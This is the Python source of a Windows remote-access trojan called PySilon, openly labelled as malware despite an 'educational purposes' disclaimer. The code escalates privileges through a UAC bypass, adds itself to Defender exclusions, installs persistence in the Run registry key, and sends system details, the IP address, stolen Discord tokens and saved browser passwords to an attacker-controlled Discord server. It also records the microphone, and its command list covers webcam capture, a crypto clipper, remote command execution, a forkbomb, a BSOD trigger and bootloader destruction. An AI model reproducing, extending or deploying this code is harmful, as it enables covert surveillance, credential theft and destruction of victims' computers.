
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! #
# !!  DON'T COMPILE OR RUN THIS FILE. IT WILL NOT WORK. INSTEAD, RUN PySilon.bat AND AFTER CLICKING 'COMPILE'  !! #
# !!  YOU CAN TEST BY RUNNING source_prepared.py (THIS IS THE FINAL VERSON OF SOURCE CODE BEFORE COMPILING)    !! #
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! #

###############################################################################
##                                                                           ##
##   DISCLAIMER !!! READ BEFORE USING                                        ##
##                                                                           ##
##   Information and code provided in this project are                       ##
##   for educational purposes only. The creator is no                        ##
##   way responsible for any direct or indirect damage                       ##
##   caused due to the misusage of the information.                          ##
##                                                                           ##
##   Everything you do, you are doing at your own risk and responsibility.   ##
##                                                                           ##
###############################################################################

import time
import os



from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from shutil import copy2, rmtree
import winreg
from zipfile import ZipFile
import requests
from filesplit.merge import Merge
from itertools import islice
from pathlib import Path
from cryptography.fernet import Fernet
import pickle
import psutil
from resources.discord_token_grabber import *
from resources.passwords_grabber import *
from browser_history import get_history
from resources.get_cookies import *
from urllib.request import urlopen
from threading import Thread
import pyaudio
from scipy.io.wavfile import write
import sounddevice
from psutil import process_iter, Process
from win32process import GetWindowThreadProcessId
from win32gui import GetForegroundWindow
import pygame.camera
import pygame.image
import time
import pyautogui
import numpy as np
import imageio
from pynput import keyboard, mouse
import ctypes
import pyperclip
import re
import json
import threading
from html2image import Html2Image
from PIL import Image
import pyttsx3
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import pygame
import monitorcontrol
from urllib.parse import urlparse
import win32gui
import win32con
import os, requests, time
from PIL import Image, ImageDraw
from win32print import * 
from win32gui import *
from win32con import *
from win32api import *
import random
import math
from resources.protections import protection_check, fake_mutex_code # [pysilon_mark] !anti-vm
from resources.discord_token_grabber import * # [pysilon_mark] !grabber
from resources.passwords_grabber import * # [pysilon_mark] !grabber
from urllib.request import urlopen
from resources.uac_bypass import *
from itertools import islice
from resources.misc import *
from getpass import getuser
from shutil import rmtree
import subprocess
import threading
import discord
import asyncio
import base64
import psutil
import json
import sys
import re
#.log Imported modules

if protection_check(): # [pysilon_mark] !anti-vm
    os._exit(0) # [pysilon_mark] !anti-vm

if not IsAdmin():
    if GetSelf()[1]:
        if UACbypass():
            os._exit(0)
#.log UAC bypassed successfully

auto = 'auto'

#
#
#    READ BEFORE TESTING!
#
#    1. If you encounter any errors, please let me know and I will be more than happy to help. [https://github.com/mategol/PySilon-malware/issues/new/choose]
#    2. I highly SUGGEST you to test compiled executable on Virtual Machnine before you will "give it a use".
#       If there would be any errors (probably wont but it's still freaking Windows), I could fix them for you.
#
#    HOW TO COMPILE:
#
#    start PySilon.bat
#
#

#####################################################################
## Following settings are configured by the builder.py by itself   ##
## Please do not touch basically anything to avoid unwanted errors ##
bot_tokens = []                                                    ##
software_registry_name = ''                                        ##
software_directory_name = ''                                       ##
software_executable_name = ''                                      ##
channel_ids = {                                                    ##
    'info': auto,                                                  ##
    'main': auto,                                                  ##
    'spam': auto,                                                  ##
    'file': auto,                                                  ##
    'recordings': auto,                                            ##
    'voice': auto                                                  ##
}                                                                  ##
secret_key = ''                                                    ##
guild_id = auto                                                    ##
## If you like this project, please leave me a Star on GitHub ;)   ##
#####################################################################

if fake_mutex_code(software_executable_name.lower()) and os.path.basename(sys.executable).lower() != software_executable_name.lower(): # [pysilon_mark] !anti-vm
    os._exit(0) # [pysilon_mark] !anti-vm
#.log Executed fake mutex code check # [pysilon_mark] !anti-vm

if IsAdmin():
    exclusion_paths = [f'C:\\Users\\{getuser()}\\{software_directory_name}']
    for path in exclusion_paths:
        try:
            subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{path}"'], creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass
#.log Added itself to Defender exclusions

client = discord.Client(intents=discord.Intents.all())
bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
opuslib_path = os.path.abspath(os.path.join(bundle_dir, './libopus-0.x64.dll'))
discord.opus.load_opus(opuslib_path)
    
ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
text_buffor, force_to_send = '', False
messages_to_send, files_to_send, embeds_to_send = [], [], []
processes_messages, processes_list, process_to_kill = [], [], ''
files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
cookies_thread, implode_confirmation, cmd_messages = None, None, []
send_recordings, input_blocked, clipper_stop, turned_off, custom_message_to_send = True, False, True, False, [None, None, None]
latest_messages_in_recordings = []
if IsAdmin(): regbase = winreg.HKEY_LOCAL_MACHINE
else: regbase = winreg.HKEY_CURRENT_USER
if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
    #.log PySilon is running for the first time on this PC (registry.py:14)*
    try:
        os.mkdir('C:\\Users\\' + getuser() + '\\' + software_directory_name)
        #.log Created PySilon\'s directory (registry.py:17)*
    except:
        pass
    copy2(sys.argv[0], 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    #.log Copied itself into Users/<username> directory (registry.py:21)*
    registry = winreg.ConnectRegistry(None, regbase)
    #.log Connected into registry (registry.py:23)*
    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    #.log Opened startup registry key (registry.py:25)*
    winreg.CreateKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    #.log Created new entry in startup key (registry.py:27)*
    registry_key = winreg.OpenKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
    #.log Opened PySilon\'s entry in startup key (registry.py:29)*
    winreg.SetValueEx(registry_key, software_registry_name, 0, winreg.REG_SZ, 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    #.log Added PySilon\' path to PySilon\'s registry entry (registry.py:31)*
    winreg.CloseKey(registry_key)
    #.log Closed the registry key (registry.py:33)*
    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', 'w', encoding='utf-8') as activator:
        process_name = sys.argv[0].split('\\')[-1]
        if IsAdmin(): attrib_value = "attrib +s +h ."
        else: attrib_value = "attrib +h ."
        activator.write(f'pushd "C:\\Users\\{getuser()}\\{software_directory_name}"\n{attrib_value}\nstart "" "{software_executable_name}"\ntaskkill /f /im "{process_name}"\ndel "%~f0"')
        #.log Generated the activator script (registry.py:39)*
    subprocess.Popen(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', creationflags=subprocess.CREATE_NO_WINDOW)
    #.log Executed the activator script. Killing itself (registry.py:41)*
    sys.exit(0)

working_directory = ['C:', 'Users', getuser(), software_directory_name]

@client.event
async def on_ready():
    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread, latest_messages_in_recordings
    #.log BOT loaded
    hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID").decode().strip()
    #.log HWID obtained
    first_run = True
    for category_name in client.get_guild(guild_id).categories:
        if hwid in str(category_name):
            first_run, category = False, category_name
            break
    #.log Checked for the first run

    if not first_run:
        #.log PySilon is not running for the first time
        category_channel_names = []
        for channel in category.channels:
            category_channel_names.append(channel.name)
        #.log Obtained the channel names in HWID category
        
        if 'spam' not in category_channel_names and channel_ids['spam']: 
            #.log Spam channel is missing
            temp = await client.get_guild(guild_id).create_text_channel('spam', category=category)
            channel_ids['spam'] = temp.id
            #.log Created spam channel
        
        if 'recordings' not in category_channel_names and channel_ids['recordings']: 
            #.log Recording channel is missing
            temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category)
            channel_ids['recordings'] = temp.id
            #.log Created recordings channel

        if 'file-related' not in category_channel_names and channel_ids['file']: 
            #.log File-related channel is missing
            temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category)
            channel_ids['file'] = temp.id
            #.log Created file-related channel
        
        if 'Live microphone' not in category_channel_names and channel_ids['voice']: 
            #.log Live microphone channel is missing
            temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category)
            channel_ids['voice'] = temp.id
            #.log Created live microphone channel
        
    if first_run:
        #.log PySilon is running for the first time
        category = await client.get_guild(guild_id).create_category(hwid)
        #.log Created HWID category
        temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
        #.log Created info channel
        temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
        #.log Created main channel
        if channel_ids['spam'] == True: temp = await client.get_guild(guild_id).create_text_channel('spam', category=category); channel_ids['spam'] = temp.id
        #.log Created spam channel
        if channel_ids['recordings'] == True: temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category); channel_ids['recordings'] = temp.id
        #.log Created recordings channel
        if channel_ids['file'] == True: temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category); channel_ids['file'] = temp.id
        #.log Created file-related channel
        if channel_ids['voice'] == True: temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id
        #.log Created live microphone channel

        try: 
            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ident.me').read().decode('utf-8') + ' [ident.me]```')
            #.log Sent IP address obtained from ident.me
        except: pass
        try:
            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8') + ' [lafibre.info]```')
            #.log Sent IP address obtained from lafibre.info
        except: pass
        system_info = force_decode(subprocess.run('systeminfo', capture_output= True, shell= True).stdout).strip().replace('\\xff', ' ')
        #.log Obtained system information

        chunk = ''
        for line in system_info.split('\n'):
            if len(chunk) + len(line) > 1990:
                await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
                chunk = line + '\n'
            else:
                chunk += line + '\n'
        await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
        #.log Sent system information on info channel

        accounts = grab_discord.initialize(False) # [pysilon_mark] !grabber
        for account in accounts: # [pysilon_mark] !grabber
            reaction_msg = await client.get_channel(channel_ids['info']).send(embed=account); await reaction_msg.add_reaction('📌') # [pysilon_mark] !grabber

        result = grab_passwords() # [pysilon_mark] !grabber
        embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff) # [pysilon_mark] !grabber
        for url in result.keys(): # [pysilon_mark] !grabber
            embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False) # [pysilon_mark] !grabber
        reaction_msg = await client.get_channel(channel_ids['info']).send(embed=embed); await reaction_msg.add_reaction('📌') # [pysilon_mark] !grabber

    else:
        #.log Fetching channel IDs...
        for channel in category.channels:
            if channel.name == 'info':
                channel_ids['info'] = channel.id
                #.log Obtained info channel ID
            elif channel.name == 'main':
                channel_ids['main'] = channel.id
                #.log Obtained main channel ID
            elif channel.name == 'spam':
                channel_ids['spam'] = channel.id
                #.log Obtained spam channel ID
            elif channel.name == 'file-related':
                channel_ids['file'] = channel.id
                #.log Obtained file-related channel ID
            elif channel.name == 'recordings':
                channel_ids['recordings'] = channel.id
                #.log Obtained recordings channel ID
            elif channel.name == 'Live microphone':
                channel_ids['voice'] = channel.id
                #.log Obtained live microphone channel ID

    await client.get_channel(channel_ids['main']).send(f"_ _\n_ _\n_ _```Starting new PC session at {current_time(True)} on HWID:{str(hwid)}{' && Bypassed UAC!' if IsAdmin() else ''}```\n_ _\n_ _\n_ _")
    #.log Sent new session info message on main channel

    recordings_obj = client.get_channel(channel_ids['recordings'])
    async for latest_message in recordings_obj.history(limit=2):
        latest_messages_in_recordings.append(latest_message.content)
    if 'disable' not in latest_messages_in_recordings:
        #.log \'disable\' message is not sent on recordings channel. Trying to start recording (microphone_recording.py:30)*
        Thread(target=start_recording).start()
        #.log Started microphone recording thread (microphone_recording.py:32)*
        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Started recording...`')
        #.log Sent message about started recording (microphone_recording.py:34)*
        latest_messages_in_recordings = []
    else:
        #.log \'disable\' message is sent on recordings channel. Aborting the record function (microphone_recording.py:37)*
        Thread(target=start_recording).start()
        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Recording disabled. If you want to enable it, just delete the "disable" message on` <#' + str(channel_ids['recordings']) + '>')
        #.log Sent message about disabled recording (microphone_recording.py:40)*
        latest_messages_in_recordings = []
    threading.Thread(target=process_blacklister).start()
    
    while True:
        global send_recordings
        recordings_obj = client.get_channel(channel_ids['recordings'])
        #.log Fetched the recordings channel
        async for latest_message in recordings_obj.history(limit=2):
            latest_messages_in_recordings.append(latest_message.content)
        #.log Fetched last message from recordings channel
        if 'disable' in latest_messages_in_recordings:
            send_recordings = False
            #.log Recordings are disabled by the attacker
        else:
            send_recordings = True
            #.log Recordings are enabled by the attacker

        latest_messages_in_recordings = []
        if len(messages_to_send) > 0:
            #.log New message to send
            for message in messages_to_send:
                #.log Trying to send a message
                await client.get_channel(message[0]).send(message[1])
                #.log Sent a message
                await asyncio.sleep(0.1)
            messages_to_send = []
        if len(files_to_send) > 0:
            #.log New file to send
            for file in files_to_send:
                #.log Trying to send a file
                await client.get_channel(file[0]).send(file[1], file=discord.File(file[2], filename=file[2]))
                #.log File successfully sent
                await asyncio.sleep(0.1)
                #.log Checking if file needs to be removed from victim\'s PC
                if file[3]:
                    #.log Trying to remove a file
                    subprocess.run('del ' + file[2], shell=True)
                    #.log Removed a file
            files_to_send = []
        if len(embeds_to_send) > 0:
            #.log New embed to send
            for embedd in embeds_to_send:
                #.log Trying to send an embed
                if len(embedd) == 3:
                    await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1], color=0x0084ff).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
                else:
                    await client.get_channel(embedd[0]).send(embed=embedd[1])
                #.log Sent an embed
                await asyncio.sleep(0.1)
            embeds_to_send = []

        await asyncio.sleep(1)

@client.event
async def on_raw_reaction_add(payload):
    #.log New reaction added (to message from different BOT session)
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    #.log Fetched reacted message
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    #.log Fetched reaction from message
    user = payload.member
    #.log Fetched reacting user
  
    if user.bot == False:
        #.log Reacting user is not a BOT
        if str(reaction) == '📌':
            #.log Reaction is "pin the message"
            if message.channel.id in channel_ids.values():
                await message.pin()
                #.log Pinned a message
                last_message = await discord.utils.get(message.channel.history())
                #.log Obtained alert about pin
                await last_message.delete()
                #.log Deleted alert about pin
        elif str(reaction) == '🔴':
            #.log Reaction is "delete the message"
            await message.delete()
            #.log Deleted the message

@client.event
async def on_reaction_add(reaction, user):
    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages, process_to_kill, expectation, cmd_messages, custom_message_to_send
    #.log New reaction added (to message from current BOT session)
    if user.bot == False:
        #.log Reacting user is not a BOT
        if reaction.message.channel.id in channel_ids.values():
            #.log Reaction channel is controlling this PC
            try:
                #.log Trying to fetch the reaction expectations
                if str(reaction) == '💀' and expectation == 'implosion':
                    #.log Reaction is "implode"
                    await reaction.message.channel.send('```PySilon will try to implode after sending this message. So if there\'s no more messages, the cleanup was successful.```')
                    #.log Sent a message about trying to implode
                    registry = winreg.ConnectRegistry(None, regbase)
                    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
                    registry_key = winreg.OpenKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
                    winreg.DeleteValue(registry_key, software_registry_name)
                    #.log Trying to remove PySilon.key
                    secure_delete_file(f'C:\\Users\\{getuser()}\\{software_directory_name}\\PySilon.key', 10)
                    #.log Removed PySilon.key. Trying to remove recordings directory
                    try:
                        rmtree('rec_')
                        #.log Removed recordings directory
                    except:
                        #.log Couldn\'t remove recordings directory. Ignoring the error
                        pass
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
                    #.log Unset critical process
                    with open(f'C:\\Users\\{getuser()}\\implode.bat', 'w', encoding='utf-8') as imploder:
                        if IsAdmin(): attrib_value = f'attrib -s -h "C:\\Users\\{getuser()}\\{software_directory_name}"'
                        else: attrib_value = f'attrib -h "C:\\Users\\{getuser()}\\{software_directory_name}"'
                        imploder.write(f'pushd "C:\\Users\\{getuser()}"\n{attrib_value}\ntaskkill /f /im "{software_executable_name}"\ntimeout /t 3 /nobreak\nrmdir /s /q "C:\\Users\\{getuser()}\\{software_directory_name}"\ndel "%~f0"')
                    #.log Saved implode.bat
                    subprocess.Popen(f'C:\\Users\\{getuser()}\\implode.bat', creationflags=subprocess.CREATE_NO_WINDOW)
                    #.log Executed implode.bat. Killing PySilon...
                    sys.exit(0)
                elif str(reaction) == '🔴' and expectation == 'implosion':
                    #.log Reaction is "cancel implosion"
                    expectation = None
                elif str(reaction) == '📤':
                    #.log Reaction is "confirm upload" (file_uploading.py:6)*
                    if expectation == 'onefile':
                        #.log One file gets uploaded (file_uploading.py:8)*
                        split_v1 = str(one_file_attachment_message.attachments).split("filename='")[1]
                        filename = str(split_v1).split("' ")[0]
                        #.log Fetched file to download (file_uploading.py:11)*
                        await one_file_attachment_message.attachments[0].save(fp='/'.join(working_directory) + '/' + filename)
                        #.log Downloaded a file (file_uploading.py:13)*
                        async for message in reaction.message.channel.history(limit=2):
                            await message.delete()
                            #.log Removed the message (file_uploading.py:16)*
                        await reaction.message.channel.send('```Uploaded  ' + filename + '  into  ' + '/'.join(working_directory) + '/' + filename + '```')
                        #.log Sent message about success (file_uploading.py:18)*
                        expectation = None
                    elif expectation == 'multiplefiles':
                        #.log Multiple files are getting uploaded (file_uploading.py:21)*
                        try: os.mkdir('temp')
                        except: rmtree('temp'); os.mkdir('temp')
                        #.log Prepared a download directory (file_uploading.py:24)*
                        await files_to_merge[0][-1].edit(content='```Uploading file 1 of ' + str(len(files_to_merge[1])) + '```')
                        #.log Sent initial message about files downloading (file_uploading.py:26)*
                        for i in range(len(files_to_merge[1])):
                            split_v1 = str(files_to_merge[1][i].attachments).split("filename='")[1]
                            filename = str(split_v1).split("' ")[0]
                            #.log Fetched file to download (file_uploading.py:30)*
                            await files_to_merge[1][i].attachments[0].save(fp='temp/' + filename)
                            #.log Downloaded a file (file_uploading.py:32)*
                            await files_to_merge[0][-1].edit(content='```Uploading file ' + str(i+1) + ' of ' + str(len(files_to_merge[1])) + '```')
                            #.log Edited the message about downloading progress (file_uploading.py:34)*
                        await files_to_merge[0][-1].edit(content='```Uploading completed```')
                        #.log Edited the messahe about downloading progress to "uploading completed" (file_uploading.py:36)*
                        for i in os.listdir('temp'):
                            if i != 'manifest':
                                os.rename('temp/' + i, 'temp/' + i[:-8])
                                #.log Renamed a file (file_uploading.py:40)*
                        Merge('temp', '/'.join(working_directory), files_to_merge[2]).merge(cleanup=True)
                        #.log Merged individual files into original one (file_uploading.py:42)*
                        rmtree('temp')
                        #.log Removed temporary directory (file_uploading.py:44)*
                        async for message in client.get_channel(channel_ids['file']).history():
                            await message.delete()
                            #.log Removed a message (file_uploading.py:47)*
                        await reaction.message.channel.send('```Uploaded  ' + files_to_merge[2] + '  into  ' + '/'.join(working_directory) + '/' + files_to_merge[2] + '```')
                        #.log Sent message about successfull upload (file_uploading.py:49)*
                        files_to_merge = [[], [], []]
                        expectation = None
                elif str(reaction) == '🔴' and reaction.message.content[:15] == '```End of tree.':
                    #.log Reaction is "remove tree messages" (file_explorer.py:9)*
                    for i in tree_messages:
                        try:
                            await i.delete()
                            #.log Deleted a tree message (file_explorer.py:13)*
                        except:
                            pass
                    tree_messages = []
                    subprocess.run('del ' + f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt', shell=True)
                    #.log Removed tree.txt (file_explorer.py:18)*
                elif str(reaction) == '📥' and reaction.message.content[:15] == '```End of tree.':
                    #.log Reaction is "download tree" (file_explorer.py:20)*
                    await reaction.message.channel.send(file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt'))
                    #.log Sent tree.txt (file_explorer.py:22)*
                    subprocess.run('del ' + f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt', shell=True)
                    #.log Removed tree.txt (file_explorer.py:24)*
                elif str(reaction) == '💀' and reaction.message.content[:39] == '```Do you really want to kill process: ':
                    #.log Reaction is "confirm killing a process" (process.py:7)*
                    await reaction.message.delete()
                    #.log Removed the message (process.py:9)*
                    try:
                        #.log Trying to parse the process name (process.py:11)*
                        process_name = process_to_kill[0]
                        if process_name[-1] == ']':
                            process_name = process_name[::-1]
                            for i in range(len(process_name)):
                                if process_name[i] == '[':
                                    process_name = process_name[i+4:]
                                    break
                            process_name = process_name[::-1]
                        #.log Process name parsed successfully (process.py:20)*
                    except Exception as e:
                        #.log Error occurred while trying to parse the process name (process.py:22)*
                        embed = discord.Embed(title="📛 Error",description=f'```Error while parsing the process name...\n' + str(e) + '```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await reaction.message.channel.send(embed=embed)
                        #.log Sent message about the error with more details (process.py:26)*
                        await reaction_msg.add_reaction('🔴')
                    try:
                        #.log Trying to kill processes (process.py:29)*
                        killed_processes = []
                        for proc in process_iter():
                            if proc.name() == process_name:
                                proc.kill()
                                #.log Killed a process (process.py:34)*
                                killed_processes.append(proc.name())
                        processes_killed = ''
                        for i in killed_processes:
                            processes_killed = processes_killed + '\n• ' + str(i)
                        embed = discord.Embed(title="🟢 Success",description=f'```Processes killed by ' + str(user) + ' at ' + current_time() + processes_killed + '```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await reaction.message.channel.send(embed=embed)
                        #.log Sent message about killed processes (process.py:42)*
                        await reaction_msg.add_reaction('🔴')
                    except Exception as e:
                        #.log Error occurred while trying to kill processes (process.py:45)*
                        embed = discord.Embed(title="📛 Error",description='```Error while killing processes...\n' + str(e) + '```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await reaction.message.channel.send(embed=embed)
                        #.log Sent message about the error with more details (process.py:49)*
                        await reaction_msg.add_reaction('🔴')
                elif str(reaction) == '🔴' and reaction.message.content[-25:] == '.kill <process-number>```':
                    #.log Reaction is "cancel process killing" (process.py:52)*
                    for i in processes_messages:
                        try: await i.delete()
                        except: pass
                    #.log Removed messages containing list of running processes (process.py:56)*
                    processes_messages = []
                elif str(reaction) == '🔴' and reaction.message.content == '```End of command stdout```':
                    #.log Reaction is "remove .cmd stdout messages" (reverse_shell.py:8)*
                    for i in cmd_messages:
                        await i.delete()
                        #.log Removed a .cmd stdout message (reverse_shell.py:11)*
                    cmd_messages = []
                elif str(reaction) == '✅':
                    if custom_message_to_send[0] != None:
                        threading.Thread(target=send_custom_message, args=(custom_message_to_send[0], custom_message_to_send[1], custom_message_to_send[2],)).start()
                        await asyncio.sleep(0.5)
                        ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
                        reaction_msg = await reaction.message.channel.send(embed=discord.Embed(title=current_time() + ' `[Sent message]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
                        await reaction_msg.add_reaction('📌')
                        subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png', shell=True)
            except Exception as err:
                #.log Failed to fetch the reaction expectations
                await reaction.message.channel.send(f'```{str(err)}```')
                #.log Sent a message with error details

@client.event
async def on_raw_reaction_remove(payload):
    #.log A reaction has been removed
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    #.log Fetched reacted message
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    #.log Fetched reaction
    user = payload.member
    #.log Fetched reacting user

    if str(reaction) == '📌':
        #.log Reaction is "unpin"
        await message.unpin()
        #.log Unpinned reacted message

help = {
    'commands': {
        'ss': ['➡️ `.ss`', 'Takes a screenshot of the victim\'s PC'],
        'screenrec': ['➡️ `.screenrec`', 'Records the screen of the victim\'s PC for 15 seconds'],
        'join': ['➡️ `.join`', 'Makes the BOT join a voice channel and live-stream microphone input'],
        'show': ['➡️ `.show <what-to-show>`', 'Displays information about specified subject. Options:\n🔹processes - displays all running processes'],
        'kill': ['➡️ `.kill <process-name>`', 'Kills a specified process. Options:\n🔹process-name - kills a specific process based on .show generated process-names'],
        'block-input': ['➡️ `.block-input`', 'Blocks keyboard and mouse inputs of the victim\'s PC'],
        'unblock-input': ['➡️ `.unblock-input`', 'Unblocks keyboard and mouse inputs of the victim\'s PC'],
        'start-clipper': ['➡️ `.start-clipper`', 'Starts the Crypto Clipper thread on the victim\'s PC'],
        'stop-clipper': ['➡️ `.stop-clipper`', 'Stops the Crypto Clipper thread on the victim\'s PC'],
        'set-critical': ['➡️ `.set-critical`', 'Elevates the process to critical status.'],
        'unset-critical': ['➡️ `.unset-critical`', 'Removes the critical status from the process.'],
        'grab': ['➡️ `.grab <what-to-grab>`', 'Grabs specified information. Options:\n🔹passwords - grabs all browser-saved passwords\n🔹history - grabs the browser history\n🔹cookies - grabs browser-cookies\n🔹wifi - grabs all WiFi saved passwords\n🔹discord - grabs all possible information from victim\'s Discord account\n🔹all - grabs discord information, passwords & cookies'],
        'clear': ['➡️ `.clear`', 'Clears all messages on the file-related channel'],
        'pwd': ['➡️ `.pwd`', 'Displays current directory path'],
        'ls': ['➡️ `.ls`', 'Lists current directory content'],
        'cd': ['➡️ `.cd <directory>`', 'Changes working directory. Options:\n🔹directory - the destination directory (.. is the previous directory)'],
        'tree': ['➡️ `.tree`', 'Displays the current directory\'s structure'],
        'download': ['➡️ `.download <file-or-directory-name>`', 'Downloads specified file or folder. Options:\n🔹file-or-directory-name - name of file or directory that you want to download'],
        'upload': ['➡️ `.upload <type> <name>`', 'Uploads a file to victim\'s PC. Options:\n🔹type - single/multiple files whether it\'s smaller or larger than 25MB (single=smaller, multiple=larger)\n🔹name - name of uploaded file on victim\'s PC'],
        'execute': ['➡️ `.execute <file-name>`', 'Execute specified file on the victim\'s PC'],
        'remove': ['➡️ `.remove <file-or-directory-name>`', 'Removes the specified file or directory. Options:\n🔹file-or-directory-name - name of file or directory that you want to remove'],
        'key': ['➡️ `.key <what-to-type>`', 'Simulates typing on the victim\'s PC. Options:\n🔹ALTF4 - performs the Alt+F4 shortcut\n🔹ALTTAB - performs the Alt+Tab shortcut'],
    },
    'commands2': {
        'blacklist': ['➡️ `.blacklist <process-name>`', 'Adds the specified process to the blacklist.'],
        'whitelist': ['➡️ `.whitelist <process-name>`', 'Removes the specified process from the blacklist.'],
        'turnoff': ['➡️ `.turnoff`', 'Turns all monitors off'],
        'turnon': ['➡️ `.turnon`', 'Turns all monitors on'],
        'block-website': ['➡️ `.block-website <url>`', 'Blocks the specified website from being accessed from any browser.'],
        'unblock-website': ['➡️ `.unblock-website <url>`', 'Unblocks access to a previously blocked website.'],
        'webcam': ['➡️ `.webcam photo`', 'Takes a photo of a victim\'s webcam (if one is detected)'],
        'forkbomb': ['➡️ `.forkbomb`', 'Creates a self-replicating process until the victim\'s PC crashes.'],
        'volume': ['➡️ `.volume`', 'Change the speaker volume on the victim\'s PC.'],
        'play': ['➡️ `.play`', 'Play any .mp3 file on the victim\'s PC.'],
        'tts': ['➡️ `.tts <message>`', 'Plays a Text-to-Speech voice message.'],
        'msg': ['➡️ `.msg <parameters>`', 'Displays a custom message box to the victim\'s PC. Parameters:\n🔹text="" - The main text of the msg box\n🔹title="" - The title of the msg box\n🔹style="" - The msg box style (1, 2, 3, 4, 5, 6)'],
        'cmd': ['➡️ `.cmd <command>`', 'Executes specified Command Prompt command on the victim\'s PC and sends back the output. Options:\n🔹command - a CMD command that will be executed on victim\'s PC'],
        'bsod': ['➡️ `.bsod`', 'Triggers a Blue Screen of Death on the victim\'s PC.'],
        'jumpscare': ['➡️ `.jumpscare`', 'Plays a very loud & rapidly flashing video.'],
        'break-windows': ['➡️ `.break-windows`', 'Destroys Windows by renaming the boot manager. (Dangerous)'],
        'disable-reset': ['➡️ `.disable-reset`', 'Disables windows recovery (ReAgentC)'],
